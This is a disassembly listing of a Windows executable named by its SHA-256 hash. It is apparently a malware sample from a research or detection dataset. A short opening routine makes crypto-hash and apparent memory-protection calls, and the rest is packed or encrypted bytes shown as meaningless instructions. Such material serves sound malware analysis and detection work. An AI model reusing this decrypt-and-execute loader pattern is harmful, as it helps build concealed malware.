
a6465463ca51da5f2fdf7a3eb669746f0a7ea848e28e500737782e2920398e71.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    DWORD PTR [ebp-0x48],0x0
  40100d:	mov    DWORD PTR [ebp-0x18],0x0
  401014:	mov    DWORD PTR [ebp-0x70],0x0
  40101b:	mov    DWORD PTR [ebp-0x60],0x0
  401022:	mov    DWORD PTR [ebp-0x8],0x0
  401029:	mov    DWORD PTR [ebp-0x6c],0x0
  401030:	mov    DWORD PTR [ebp-0x68],0x0
  401037:	mov    DWORD PTR [ebp-0x14],0x0
  40103e:	mov    DWORD PTR [ebp-0x4c],0x0
  401045:	mov    DWORD PTR [ebp-0x10],0x0
  40104c:	mov    DWORD PTR [ebp-0x58],0x0
  401053:	mov    DWORD PTR [ebp-0x4],0x0
  40105a:	mov    DWORD PTR [ebp-0x5c],0x0
  401061:	mov    DWORD PTR [ebp-0x30],0x0
  401068:	mov    DWORD PTR [ebp-0x54],0x0
  40106f:	mov    DWORD PTR [ebp-0x2c],0x0
  401076:	mov    DWORD PTR [ebp-0x50],0x0
  40107d:	mov    DWORD PTR [ebp-0xc],0x0
  401084:	mov    eax,ds:0x4493e8
  401089:	mov    DWORD PTR [ebp-0x28],eax
  40108c:	mov    ecx,DWORD PTR ds:0x4493ec
  401092:	mov    DWORD PTR [ebp-0x24],ecx
  401095:	mov    edx,DWORD PTR ds:0x4493f0
  40109b:	mov    DWORD PTR [ebp-0x20],edx
  40109e:	mov    al,ds:0x4493f4
  4010a3:	mov    BYTE PTR [ebp-0x1c],al
  4010a6:	mov    ecx,DWORD PTR ds:0x4493f8
  4010ac:	mov    DWORD PTR [ebp-0x40],ecx
  4010af:	mov    edx,DWORD PTR ds:0x4493fc
  4010b5:	mov    DWORD PTR [ebp-0x3c],edx
  4010b8:	mov    eax,ds:0x449400
  4010bd:	mov    DWORD PTR [ebp-0x38],eax
  4010c0:	mov    cx,WORD PTR ds:0x449404
  4010c7:	mov    WORD PTR [ebp-0x34],cx
  4010cb:	mov    dl,BYTE PTR ds:0x449406
  4010d1:	mov    BYTE PTR [ebp-0x32],dl
  4010d4:	mov    DWORD PTR [ebp-0x30],0x40
  4010db:	lea    eax,[ebp-0x40]
  4010de:	push   eax
  4010df:	lea    ecx,[ebp-0x10]
  4010e2:	push   ecx
  4010e3:	call   DWORD PTR ds:0x417004
  4010e9:	test   eax,eax
  4010eb:	je     0x41534a
  4010f1:	push   0x1
  4010f3:	lea    edx,[ebp-0x10]
  4010f6:	push   edx
  4010f7:	call   DWORD PTR ds:0x417008
  4010fd:	lea    eax,[ebp-0x10]
  401100:	push   eax
  401101:	push   0x0
  401103:	push   0x0
  401105:	push   0x1
  401107:	call   DWORD PTR ds:0x41700c
  40110d:	mov    ecx,DWORD PTR [ebp-0x10]
  401110:	add    ecx,0x1
  401113:	mov    DWORD PTR [ebp-0x10],ecx
  401116:	lea    edx,[ebp-0x30]
  401119:	push   edx
  40111a:	lea    eax,[ebp-0x50]
  40111d:	push   eax
  40111e:	push   0x40
  401120:	push   0x7
  401122:	push   0x0
  401124:	mov    ecx,DWORD PTR [ebp-0x50]
  401127:	push   ecx
  401128:	call   DWORD PTR ds:0x417000
  40112e:	lea    edx,[ebp-0x50]
  401131:	push   edx
  401132:	push   0x0
  401134:	push   0x8003
  401139:	mov    eax,DWORD PTR [ebp-0x50]
  40113c:	push   eax
  40113d:	call   DWORD PTR ds:0x417010
  401143:	lea    ecx,[ebp-0x50]
  401146:	push   ecx
  401147:	push   0x0
  401149:	push   0x0
  40114b:	push   0x8003
  401150:	mov    edx,DWORD PTR [ebp-0x50]
  401153:	push   edx
  401154:	call   DWORD PTR ds:0x417018
  40115a:	lea    eax,[ebp-0x50]
  40115d:	push   eax
  40115e:	push   0x0
  401160:	push   0x0
  401162:	push   0x0
  401164:	mov    ecx,DWORD PTR [ebp-0x50]
  401167:	push   ecx
  401168:	call   DWORD PTR ds:0x417014
  40116e:	aaa    
  40116f:	jecxz  0x401135
  401171:	pop    ebp
  401172:	(bad)  
  401173:	push   cs
  401174:	lods   al,BYTE PTR ds:[esi]
  401175:	cmp    DWORD PTR [edx-0x5c],ebx
  401178:	dec    ebx
  401179:	out    dx,eax
  40117a:	sbb    BYTE PTR [edx-0x768bd6b9],ah
  401180:	push   edx
  401181:	fsub   QWORD PTR [edi-0x36]
  401184:	fs cwde 
  401186:	fistp  DWORD PTR [edx]
  401188:	adc    DWORD PTR [edi],0x55206a95
  40118e:	inc    ebp
  40118f:	(bad)  
  401190:	push   edx
  401191:	adc    DWORD PTR ds:0xc52c1aa2,edi
  401197:	in     eax,0x23
  401199:	cmc    
  40119a:	retf   0xbf7
  40119d:	je     0x40118a
  40119f:	mov    al,ds:0xf2b73348
  4011a4:	push   0x3ace2e0d
  4011a9:	je     0x401176
  4011ab:	jno    0x4011ef
  4011ad:	out    dx,al
  4011ae:	push   esp
  4011af:	sub    ch,BYTE PTR [esp+edi*8+0x6992b55a]
  4011b6:	ins    DWORD PTR es:[edi],dx
  4011b7:	pop    ss
  4011b8:	fs in  al,0x83
  4011bb:	jg     0x40122c
  4011bd:	int    0x1c
  4011bf:	dec    ebx
  4011c0:	clc    
  4011c1:	push   esi
  4011c2:	jle    0x401209
  4011c4:	adc    BYTE PTR [ebx-0x27],dl
  4011c7:	in     eax,0x2a
  4011c9:	xor    DWORD PTR fs:[esi-0x214de06],esi
  4011d0:	fstp   DWORD PTR ds:0x1933c8bb
  4011d6:	ja     0x401215
  4011d8:	or     cl,BYTE PTR [esi-0x7d]
  4011db:	call   0xfabf:0x908e0e7e
  4011e2:	inc    esi
  4011e3:	xchg   edi,eax
  4011e4:	(bad)
  4011e8:	in     eax,0xcd
  4011ea:	jle    0x401237
  4011ec:	jns    0x4011c3
  4011ee:	push   cs
  4011ef:	cdq    
  4011f0:	rol    DWORD PTR [ebx+0x2c],cl
  4011f3:	xor    bl,BYTE PTR [edi]
  4011f5:	sub    al,BYTE PTR [ebx]
  4011f7:	xlat   BYTE PTR ds:[ebx]
  4011f8:	fiadd  WORD PTR [ebx+0x37a9bac7]
  4011fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011ff:	push   ds
  401200:	and    al,BYTE PTR [edi]
  401202:	fmul   QWORD PTR [eax-0x26]
  401205:	inc    eax
  401206:	or     BYTE PTR [esi+0x17b00fea],0xa7
  40120d:	mov    cl,0x41
  40120f:	push   esi
  401210:	rol    DWORD PTR [esi+eax*4-0x21],cl
  401214:	sub    al,0xdd
  401216:	aam    0xf1
  401218:	and    eax,0x3d3d499c
  40121d:	sbb    cl,BYTE PTR [ecx+0x5de0e23b]
  401223:	fcmovnbe st,st(7)
  401225:	sub    ebx,DWORD PTR [edx-0x57]
  401228:	mov    ds:0x9acb1500,al
  40122d:	xchg   BYTE PTR [eax+ebx*1+0x2d],ah
  401231:	mov    cl,0x24
  401233:	lds    edx,FWORD PTR [esi+0x53ce2c85]
  401239:	(bad)  
  40123a:	pop    ds
  40123b:	fld    DWORD PTR [esi-0x5c8317f3]
  401241:	ficomp WORD PTR [edi+0x26]
  401244:	inc    edx
  401245:	ss enter 0xfe0,0x35
  40124a:	cmp    al,0x13
  40124c:	and    BYTE PTR [edx-0x17],bl
  40124f:	test   DWORD PTR [ebx],ebp
  401251:	and    bh,BYTE PTR [edi-0x75f6cf1c]
  401257:	inc    esp
  401258:	inc    ebx
  401259:	and    bl,BYTE PTR [esi+eiz*8-0x60]
  40125d:	or     al,0xbc
  40125f:	push   esi
  401260:	shl    WORD PTR [ebx],cl
  401263:	gs add edi,ecx
  401266:	dec    edx
  401267:	ins    BYTE PTR es:[edi],dx
  401268:	cmp    bl,BYTE PTR cs:[ebp+0x382945dd]
  40126f:	push   ebp
  401270:	mov    ebp,es
  401272:	pop    esp
  401273:	jns    0x40128b
  401275:	test   al,0x31
  401277:	or     BYTE PTR [edx+ebp*1-0x33f7587c],0x2a
  40127f:	pushf  
  401280:	jmp    0x40123a
  401282:	inc    ebx
  401283:	in     al,0xb5
  401285:	mov    ah,0xe8
  401287:	cld    
  401288:	cmp    al,0xc8
  40128a:	push   edi
  40128b:	data16 sbb al,0xfe
  40128e:	xchg   ebx,eax
  40128f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401290:	int    0xf
  401292:	nop    DWORD PTR [edx+0x59]
  401296:	xchg   ebp,eax
  401297:	imul   eax,DWORD PTR [eax],0xb151dbe0
  40129d:	hlt    
  40129e:	std    
  40129f:	mov    al,ds:0xe6f9f22f
  4012a4:	into   
  4012a5:	mov    esp,0xda3768be
  4012aa:	sbb    al,bl
  4012ac:	xlat   BYTE PTR ds:[ebx]
  4012ad:	xchg   DWORD PTR fs:[edx+eax*4],ebx
  4012b1:	scas   al,BYTE PTR es:[edi]
  4012b2:	mov    esp,0x65660cf3
  4012b7:	mov    dh,0x19
  4012b9:	push   0x7f
  4012bb:	or     DWORD PTR [ebx],esp
  4012bd:	ds test al,0x70
  4012c0:	mov    ebp,0xb59b9edb
  4012c5:	mov    DWORD PTR [eax+0x21],0xc35ef180
  4012cc:	imul   esi,DWORD PTR [edx+esi*1],0xffffff80
  4012d0:	in     al,dx
  4012d1:	scas   al,BYTE PTR es:[edi]
  4012d2:	es (bad) 
  4012d4:	pop    ebx
  4012d5:	adc    al,al
  4012d7:	mov    ebp,0x8cdf98d5
  4012dc:	loope  0x401273
  4012de:	mov    ah,0x28
  4012e0:	mov    al,ds:0xd50a7cd5
  4012e5:	fsubr  QWORD PTR [edi+0x6e]
  4012e8:	jecxz  0x401274
  4012ea:	mov    DWORD PTR [ebx],ebp
  4012ec:	xchg   ebx,eax
  4012ed:	cmp    ebx,esi
  4012ef:	fdivr  QWORD PTR [ebx*8-0x695e9f05]
  4012f6:	mov    edi,0x948be4eb
  4012fb:	ret    
  4012fc:	lahf   
  4012fd:	hlt    
  4012fe:	xchg   edi,eax
  4012ff:	cmp    al,0x3e
  401301:	nop
  401302:	pop    ds
  401303:	inc    edx
  401304:	push   edi
  401305:	ds test ah,ah
  401308:	leave  
  401309:	sbb    DWORD PTR [ebx+0x26],edx
  40130c:	mov    esi,0xf81acef5
  401311:	inc    ebp
  401312:	push   edx
  401313:	add    al,0x6e
  401315:	lds    ebp,FWORD PTR [edi+0x25ba5243]
  40131b:	loopne 0x401318
  40131d:	push   es
  40131e:	in     eax,dx
  40131f:	sbb    BYTE PTR ds:0x8279a838,dh
  401325:	addr16 mov ebp,0x25faea3b
  40132b:	sub    dl,bh
  40132d:	xchg   DWORD PTR [ebp+0x2ec1cfc6],eax
  401333:	or     dh,ah
  401335:	mov    ch,BYTE PTR [ebx-0x614b3cc3]
  40133b:	mov    edi,0x1b804da5
  401340:	mov    ch,0x89
  401342:	(bad)  
  401343:	int    0x23
  401345:	adc    DWORD PTR [edx],esi
  401347:	daa    
  401348:	call   0x1fd1d010
  40134d:	cmp    esi,DWORD PTR [ecx-0xf]
  401350:	add    ebp,DWORD PTR [ebp+edi*1+0x353d1f3d]
  401357:	test   DWORD PTR [ebx-0x329eb8ce],ecx
  40135d:	lea    ebp,[eax]
  40135f:	push   ebp
  401360:	jno    0x4012e2
  401362:	stos   DWORD PTR es:[edi],eax
  401363:	xchg   esi,eax
  401364:	push   ecx
  401365:	pop    edi
  401366:	daa    
  401367:	sar    DWORD PTR [edi],cl
  401369:	or     ecx,DWORD PTR [ebx]
  40136b:	sbb    edx,DWORD PTR [ebx-0x4e]
  40136e:	xchg   edx,eax
  40136f:	aas    
  401370:	pop    ebp
  401371:	push   esp
  401372:	aad    0xf0
  401374:	dec    ebx
  401375:	push   0x2b
  401377:	and    eax,0x24dae85d
  40137c:	adc    bh,0x51
  40137f:	pop    ecx
  401380:	mov    DWORD PTR [edx+0x3457d555],edi
  401386:	add    eax,0x968d6963
  40138b:	shl    DWORD PTR [eax],0x46
  40138e:	mov    eax,0x15620f56
  401393:	dec    ebx
  401394:	call   0x5b98c4
  401399:	mov    dl,0x7c
  40139b:	cmp    esp,DWORD PTR [ebx+0x5e61c3ce]
  4013a1:	push   eax
  4013a2:	sbb    esp,DWORD PTR [edi]
  4013a4:	sub    al,0x89
  4013a6:	imul   DWORD PTR [edi+0x57]
  4013a9:	jo     0x401422
  4013ab:	outs   dx,DWORD PTR ds:[esi]
  4013ac:	lods   al,BYTE PTR gs:[esi]
  4013ae:	outs   dx,DWORD PTR ds:[esi]
  4013af:	mov    ds,WORD PTR [eax-0x4e975688]
  4013b5:	pop    ss
  4013b6:	in     eax,dx
  4013b7:	sbb    eax,0x45321ba0
  4013bc:	or     al,0xa7
  4013be:	mov    ah,0x7e
  4013c0:	mov    ds:0xf811b3dc,eax
  4013c5:	dec    edi
  4013c6:	or     dh,ch
  4013c8:	sub    dh,ah
  4013ca:	outs   dx,DWORD PTR ds:[esi]
  4013cb:	mov    BYTE PTR [eax+0x7b],al
  4013ce:	icebp  
  4013cf:	jnp    0x4013c4
  4013d1:	cwde   
  4013d2:	sub    al,BYTE PTR [edi+edi*4-0x1bb013c5]
  4013d9:	inc    edx
  4013da:	mov    edx,0x437f8405
  4013df:	xchg   ecx,eax
  4013e0:	xor    bl,cl
  4013e2:	push   ecx
  4013e3:	jmp    0x4013d3
  4013e5:	lea    ebp,[esi-0x5d]
  4013e8:	sbb    dl,dl
  4013ea:	aaa    
  4013eb:	(bad)  
  4013ec:	sar    DWORD PTR [ecx*8+0x3701419b],1
  4013f3:	jmp    0x8ef5:0x2ef2f9a7
  4013fa:	(bad)  
  4013fb:	or     esi,DWORD PTR [eax]
  4013fd:	scas   al,BYTE PTR es:[edi]
  4013fe:	ret    
  4013ff:	push   esp
  401400:	or     DWORD PTR [ecx-0x55],eax
  401403:	pushf  
  401404:	add    eax,DWORD PTR [eax]
  401406:	test   cl,0xbf
  401409:	push   ecx
  40140a:	jg     0x40140c
  40140c:	call   0xb17a9454
  401411:	cli    
  401412:	daa    
  401413:	iret   
  401414:	ds push edi
  401416:	lds    edx,FWORD PTR [ebx]
  401418:	retf   0x96c1
  40141b:	sub    eax,0x8416c2bb
  401420:	jp     0x401441
  401422:	aas    
  401423:	inc    eax
  401424:	or     dl,dh
  401426:	mov    ecx,0xf18d5529
  40142b:	mov    esp,DWORD PTR [eax-0x5fd53571]
  401431:	jns    0x401423
  401433:	and    bh,ah
  401435:	mov    ch,0x41
  401437:	loope  0x4014b4
  401439:	xchg   esp,eax
  40143a:	(bad)  
  40143b:	and    BYTE PTR [edx+0x6d],bh
  40143e:	push   eax
  40143f:	scas   eax,DWORD PTR es:[edi]
  401440:	pop    ss
  401441:	mov    bh,0x21
  401443:	ret    0x7b64
  401446:	loopne 0x4013e1
  401448:	adc    BYTE PTR [ebx],ch
  40144a:	lods   eax,DWORD PTR ds:[esi]
  40144b:	pop    esi
  40144c:	push   ecx
  40144d:	xchg   ebx,eax
  40144e:	aam    0x5e
  401450:	cmp    al,0xdb
  401452:	in     eax,dx
  401453:	cmp    eax,0xcda0a075
  401458:	(bad)  
  401459:	push   edi
  40145a:	and    BYTE PTR [ecx+0x7a74d389],0xa7
  401461:	or     DWORD PTR [edx],ecx
  401463:	lahf   
  401464:	mov    ah,0xa9
  401466:	out    dx,al
  401467:	add    DWORD PTR [edx-0x4b],ebp
  40146a:	cmp    dl,0xef
  40146d:	(bad)  
  40146f:	int3   
  401470:	pusha  
  401471:	in     eax,dx
  401472:	jae    0x401400
  401474:	fdiv   QWORD PTR [esi+0x2c09e1b2]
  40147a:	jbe    0x4014b7
  40147c:	xchg   BYTE PTR [esi],bl
  40147e:	mov    edx,0xf3fbf72
  401483:	pop    es
  401484:	(bad)  
  401485:	repz xor bh,bh
  401488:	lods   al,BYTE PTR ds:[esi]
  401489:	sub    ah,BYTE PTR ds:0x37f0b517
  40148f:	inc    edx
  401490:	int3   
  401491:	xor    al,0xcf
  401493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401494:	jge    0x4014e4
  401496:	adc    eax,0x1f100c2e
  40149b:	clc    
  40149c:	cmp    eax,0x4a255f2e
  4014a1:	sbb    eax,0xb2ce33cf
  4014a6:	cmc    
  4014a7:	inc    edx
  4014a8:	inc    esp
  4014a9:	in     al,dx
  4014aa:	js     0x4014fb
  4014ac:	mov    bl,0x5f
  4014ae:	dec    ecx
  4014af:	repnz fwait
  4014b1:	cdq    
  4014b2:	pop    ds
  4014b3:	std    
  4014b4:	dec    edi
  4014b5:	mov    al,0xf9
  4014b7:	mov    dh,0x78
  4014b9:	shl    BYTE PTR [edx-0x2cd8fb44],1
  4014bf:	mov    dh,0x24
  4014c1:	lds    edi,FWORD PTR [ebx+ebx*4-0x784890bb]
  4014c8:	pop    eax
  4014c9:	iret   
  4014ca:	out    dx,eax
  4014cb:	push   0x65
  4014cd:	xor    BYTE PTR [edx],ah
  4014cf:	(bad)  
  4014d0:	jnp    0x4014c7
  4014d2:	add    DWORD PTR [esi+0x4ba05cec],ebx
  4014d8:	mov    bh,0x79
  4014da:	xor    dl,BYTE PTR [ebp-0x3e1b171a]
  4014e0:	mov    al,0xd4
  4014e2:	cmc    
  4014e3:	cs ins BYTE PTR es:[edi],dx
  4014e5:	or     eax,0x17196889
  4014ea:	cmp    ebp,ecx
  4014ec:	test   DWORD PTR [edx],esp
  4014ee:	repnz imul ebx,DWORD PTR [eax],0x6884b0d6
  4014f5:	jmp    0x41f0:0xb2002dcd
  4014fc:	outs   dx,DWORD PTR ds:[esi]
  4014fd:	push   esp
  4014fe:	xchg   esp,eax
  4014ff:	inc    edi
  401500:	(bad)  [eax-0x31]
  401503:	mov    ds:0x26402716,eax
  401508:	addr16 sbb ah,ah
  40150b:	cmp    edi,esp
  40150d:	fsub   QWORD PTR [ecx-0x7df2953b]
  401513:	mov    ebx,0xe38c137b
  401518:	add    eax,esp
  40151a:	mov    ds:0xdc4db240,eax
  40151f:	fldenv [esi+0x7af55ff4]
  401525:	test   edi,ebp
  401527:	cwde   
  401528:	cwde   
  401529:	(bad)  
  40152a:	scas   eax,DWORD PTR es:[edi]
  40152b:	xchg   edx,eax
  40152c:	jnp    0x401573
  40152e:	xor    DWORD PTR [esi+ecx*1],edi
  401531:	sub    al,0xa1
  401533:	and    dl,BYTE PTR [eax-0x3]
  401536:	ds dec ebx
  401538:	dec    ecx
  401539:	sub    BYTE PTR [eax+0x11],dh
  40153c:	and    al,0xc1
  40153e:	push   edx
  40153f:	rol    DWORD PTR [edx+0x7d],1
  401542:	bnd je 0x40159a
  401545:	in     al,0xed
  401547:	clc    
  401548:	or     DWORD PTR [esi],ecx
  40154a:	or     al,0xe0
  40154c:	xor    al,0xa0
  40154e:	sub    eax,esi
  401550:	inc    esp
  401551:	xchg   DWORD PTR [esi],esp
  401553:	ret    0x851a
  401556:	scas   al,BYTE PTR es:[edi]
  401557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401558:	inc    esp
  401559:	int    0x3d
  40155b:	fst    DWORD PTR [esi+0x68bfe252]
  401561:	pop    esp
  401562:	cdq    
  401563:	xchg   BYTE PTR ds:0xf891c789,dl
  401569:	add    BYTE PTR [edi-0x12],0x74
  40156d:	data16 jecxz 0x40158f
  401570:	imul   esi,DWORD PTR [edi],0x85ea558b
  401576:	dec    edi
  401577:	jmp    0xb5fb:0x5560d682
  40157e:	adc    dh,BYTE PTR ds:[edi+0x3fc92864]
  401585:	and    BYTE PTR [ecx+0x62c30b6c],ah
  40158b:	mov    cl,0xdf
  40158d:	jo     0x401540
  40158f:	sar    dh,cl
  401591:	fisubr DWORD PTR [ebx]
  401593:	pop    ss
  401594:	mov    ch,0xa1
  401596:	not    DWORD PTR [edx-0x4e]
  401599:	les    ebx,FWORD PTR [eax-0x748ce517]
  40159f:	inc    ecx
  4015a0:	clc    
  4015a1:	jno    0x40153d
  4015a3:	rcl    BYTE PTR [edx+0x70],1
  4015a6:	mov    ebp,0x4ab3458f
  4015ab:	mov    esi,0x3ec6705b
  4015b0:	pop    edi
  4015b1:	mov    ?,WORD PTR ss:[eax]
  4015b4:	add    al,0xae
  4015b6:	sub    al,0x8
  4015b8:	stos   BYTE PTR es:[edi],al
  4015b9:	aam    0x36
  4015bb:	cdq    
  4015bc:	xor    BYTE PTR [edx+0x7265a48f],dl
  4015c2:	shl    BYTE PTR [bx-0x8],cl
  4015c6:	lods   eax,DWORD PTR ds:[esi]
  4015c7:	xor    ebx,DWORD PTR [edx-0x39ef9621]
  4015cd:	xchg   ebx,eax
  4015ce:	or     DWORD PTR [edx+0x6a],esp
  4015d1:	mov    ch,0xf0
  4015d3:	test   eax,0x1c4ebc63
  4015d8:	mov    cl,0x10
  4015da:	outs   dx,DWORD PTR ds:[esi]
  4015db:	repnz push ebp
  4015dd:	and    al,0x8c
  4015df:	fistp  DWORD PTR [esp+edx*8+0x69]
  4015e3:	jmp    0x6e764d15
  4015e8:	test   BYTE PTR [ebp+0x1e],dh
  4015eb:	and    eax,0xe4998dc0
  4015f0:	jb     0x401576
  4015f2:	and    al,0xc2
  4015f4:	mov    dh,0xac
  4015f6:	aas    
  4015f7:	out    0xed,eax
  4015f9:	sub    esp,DWORD PTR [ebp+ecx*2-0x77]
  4015fd:	aad    0xbe
  4015ff:	fild   DWORD PTR [ebp+eiz*4+0x71]
  401603:	sub    ebp,DWORD PTR [eax-0xdb34b3e]
  401609:	xor    ebp,0xffffff9c
  40160c:	adc    BYTE PTR [esi+0x61],bl
  40160f:	jae    0x40161b
  401611:	mov    cl,0x13
  401613:	outs   dx,DWORD PTR ds:[esi]
  401614:	xor    al,ch
  401616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401617:	call   DWORD PTR [edi]
  401619:	loop   0x40166f
  40161b:	je     0x401632
  40161d:	aad    0x42
  40161f:	aas    
  401620:	or     BYTE PTR [eax+0x3e],bh
  401623:	jno    0x401627
  401625:	vshufps xmm0,xmm3,XMMWORD PTR [ebp+0x6cb93bc3],0x68
  40162e:	pop    eax
  40162f:	aas    
  401630:	dec    esp
  401631:	cmp    al,0x11
  401633:	in     eax,0xec
  401635:	sub    al,ah
  401637:	or     bl,BYTE PTR [esi]
  401639:	loopne 0x4016a8
  40163b:	dec    edi
  40163c:	test   BYTE PTR [ebx-0x6e0a08d2],cl
  401642:	xchg   edi,eax
  401643:	dec    ebp
  401644:	and    esi,edx
  401646:	test   BYTE PTR [ecx-0x50],ch
  401649:	pop    esp
  40164a:	mov    dl,0x94
  40164c:	dec    esp
  40164d:	loopne 0x4016bf
  40164f:	das    
  401650:	jae    0x4016ce
  401652:	sbb    al,0x1c
  401654:	test   al,0x26
  401656:	lock in eax,0xe8
  401659:	pop    esp
  40165a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40165b:	fsub   st,st(3)
  40165d:	psubsw mm4,QWORD PTR [ecx+0x14]
  401661:	lea    ebp,[edi+0x28]
  401664:	mov    edi,edi
  401666:	int3   
  401667:	stos   BYTE PTR es:[edi],al
  401668:	adc    al,0x5d
  40166a:	dec    eax
  40166b:	inc    edi
  40166c:	loopne 0x4016c0
  40166e:	sub    ecx,0xc01869df
  401674:	daa    
  401675:	lahf   
  401676:	sub    eax,0x7aca136f
  40167b:	leave  
  40167c:	cld    
  40167d:	mov    BYTE PTR [edi],0x16
  401680:	adc    BYTE PTR [edi+0x78],dl
  401683:	retf   
  401684:	jo     0x4016e0
  401686:	or     esi,DWORD PTR [esi+ebp*4-0x73ca406a]
  40168d:	mov    edi,0x11c106dc
  401692:	jl     0x401644
  401694:	aad    0xf9
  401696:	cwde   
  401697:	push   esi
  401698:	dec    edi
  401699:	aam    0xf
  40169b:	xchg   esi,eax
  40169c:	mov    ds:0x74441977,eax
  4016a1:	outs   dx,DWORD PTR fs:[esi]
  4016a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016a4:	xchg   edi,eax
  4016a5:	int    0xb1
  4016a7:	ss scas al,BYTE PTR es:[edi]
  4016a9:	xchg   edi,eax
  4016aa:	inc    ecx
  4016ab:	clc    
  4016ac:	cmp    al,0x5
  4016ae:	xchg   esp,eax
  4016af:	scas   al,BYTE PTR es:[edi]
  4016b0:	into   
  4016b1:	push   edx
  4016b2:	sti    
  4016b3:	dec    ebp
  4016b4:	outs   dx,DWORD PTR ds:[esi]
  4016b5:	sbb    BYTE PTR [esi],al
  4016b7:	retf   
  4016b8:	stos   BYTE PTR es:[di],al
  4016ba:	and    eax,0x9cc62915
  4016bf:	stos   BYTE PTR es:[edi],al
  4016c0:	sub    edi,DWORD PTR [ecx+esi*4]
  4016c3:	dec    BYTE PTR [ecx+eiz*8-0x73]
  4016c7:	into   
  4016c8:	mov    dh,0xd8
  4016ca:	add    eax,0x22119a9f
  4016cf:	sub    bl,BYTE PTR [ebp+eiz*2-0x6ccc63c8]
  4016d6:	test   bh,dh
  4016d8:	jp     0x401698
  4016da:	leave  
  4016db:	addr16 arpl cx,sp
  4016de:	pop    esi
  4016df:	aad    0x6
  4016e1:	scas   eax,DWORD PTR es:[edi]
  4016e2:	dec    ebp
  4016e3:	int3   
  4016e4:	push   ss
  4016e5:	cmp    DWORD PTR [edi-0x3d],edi
  4016e8:	cld    
  4016e9:	and    DWORD PTR [ebp-0x1],ebp
  4016ec:	(bad)  
  4016ed:	test   BYTE PTR [eax+ebp*8+0x28bc34ed],0x83
  4016f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f6:	mov    edi,0xfc5429ab
  4016fb:	ja     0x40169c
  4016fd:	sub    eax,0x90de91a8
  401702:	pop    esp
  401703:	fs fs repz inc esi
  401707:	les    ebx,FWORD PTR [esi]
  401709:	pop    esi
  40170a:	stos   BYTE PTR es:[edi],al
  40170b:	dec    eax
  40170c:	push   ebp
  40170d:	aam    0x44
  40170f:	inc    eax
  401710:	add    ecx,ebp
  401712:	xchg   esp,eax
  401713:	ficom  WORD PTR [ebp+0x4d2e881d]
  401719:	fnstcw WORD PTR [ecx+eiz*8]
  40171c:	xchg   DWORD PTR ds:0xfc45a0be,edx
  401722:	push   ebp
  401723:	inc    esp
  401724:	jns    0x401713
  401726:	pop    ds
  401727:	jl     0x401721
  401729:	mov    BYTE PTR [edx+edi*2-0x1e0ce07c],ah
  401730:	xor    DWORD PTR [ebp-0x2d34620d],edx
  401736:	add    al,0xdf
  401738:	jne    0x40174c
  40173a:	dec    edi
  40173b:	add    eax,edi
  40173d:	dec    esp
  40173e:	xchg   ebp,eax
  40173f:	cld    
  401740:	sbb    ecx,DWORD PTR [edx]
  401742:	aam    0x18
  401744:	das    
  401745:	pop    es
  401746:	pop    ecx
  401747:	addr16 xchg esp,eax
  401749:	xchg   edx,eax
  40174a:	add    esp,DWORD PTR [ecx]
  40174c:	or     ebp,DWORD PTR [edx+0x77854f53]
  401752:	adc    al,0xd9
  401754:	stos   BYTE PTR es:[edi],al
  401755:	mov    ebx,0x59f5a748
  40175a:	inc    esp
  40175b:	pop    esp
  40175c:	in     al,0x78
  40175e:	cmc    
  40175f:	push   es
  401760:	dec    edi
  401761:	mov    es,WORD PTR [eax+eiz*8+0x7c]
  401765:	xchg   ebx,eax
  401766:	or     BYTE PTR [ecx],al
  401768:	lahf   
  401769:	push   es
  40176a:	jne    0x4016f6
  40176c:	cmp    BYTE PTR [esi],ah
  40176e:	jbe    0x401705
  401770:	outs   dx,DWORD PTR ds:[esi]
  401771:	pop    edx
  401772:	push   edx
  401773:	shr    BYTE PTR [eax+eax*1-0x29bdbb64],0x21
  40177b:	cmp    al,dh
  40177d:	jecxz  0x401751
  40177f:	bound  ebp,QWORD PTR ds:0x877b28e4
  401785:	mov    ah,0x79
  401787:	sbb    bh,dl
  401789:	pusha  
  40178a:	adc    al,0xd6
  40178c:	push   0xa86cadc8
  401791:	repnz and BYTE PTR [esi],dh
  401794:	or     eax,0x3b303235
  401799:	and    ecx,edx
  40179b:	mov    esi,0x934c61f7
  4017a0:	xor    eax,0xcdb60554
  4017a5:	jmp    0xd063:0x1dfada3d
  4017ac:	sbb    bl,bl
  4017ae:	gs das 
  4017b0:	cmp    BYTE PTR [ebp+0x1c],dh
  4017b3:	inc    ecx
  4017b4:	ins    DWORD PTR es:[edi],dx
  4017b5:	ja     0x4017f4
  4017b7:	iret   
  4017b8:	add    al,0xbb
  4017ba:	popa   
  4017bb:	pushf  
  4017bc:	lds    eax,FWORD PTR [edi+0x16]
  4017bf:	xor    DWORD PTR [edi],0xffffffbf
  4017c2:	inc    eax
  4017c3:	leave  
  4017c4:	adc    ah,cl
  4017c6:	mov    eax,0xf0a31b9c
  4017cb:	jbe    0x4017be
  4017cd:	sbb    ch,ah
  4017cf:	fucomp st(5)
  4017d1:	daa    
  4017d2:	test   DWORD PTR ds:[ebp+0x19],eax
  4017d6:	cwde   
  4017d7:	retf   
  4017d8:	(bad)  
  4017d9:	dec    esi
  4017da:	into   
  4017db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017dc:	push   esi
  4017dd:	or     eax,0xc53a675a
  4017e2:	adc    al,0x20
  4017e4:	lahf   
  4017e5:	sbb    eax,DWORD PTR [eax]
  4017e7:	ds ret 
  4017e9:	jecxz  0x40181e
  4017eb:	xor    eax,0xd351d016
  4017f0:	add    eax,0xb2045c50
  4017f5:	sub    cl,bh
  4017f7:	pop    edx
  4017f8:	adc    ebx,DWORD PTR ds:0x5dfb3e02
  4017fe:	jl     0x4017cf
  401800:	arpl   WORD PTR [ebp+ebp*1-0x3ae8c603],ax
  401807:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401809:	and    dh,dh
  40180b:	push   es
  40180c:	jp     0x401810
  40180e:	(bad)  
